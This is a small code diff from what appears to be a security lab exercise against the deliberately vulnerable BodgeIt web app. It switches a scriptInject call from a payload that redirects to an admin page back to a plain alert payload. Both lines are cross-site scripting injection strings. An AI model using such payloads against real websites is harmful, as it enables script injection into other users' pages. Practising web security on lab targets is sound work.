@@ -18,5 +18,5 @@ function scriptInject(payload){
   });
 
 }
-//scriptInject('<script>alert("1337");</script>');
-scriptInject('<script>alert("1337");window.location="http://bodgeit.local:8080/admin.jsp"</script>');
+scriptInject('<script>alert("1337");</script>');
+// scriptInject('<script>alert("1337");window.location="http://bodgeit.local:8080/admin.jsp"</script>');
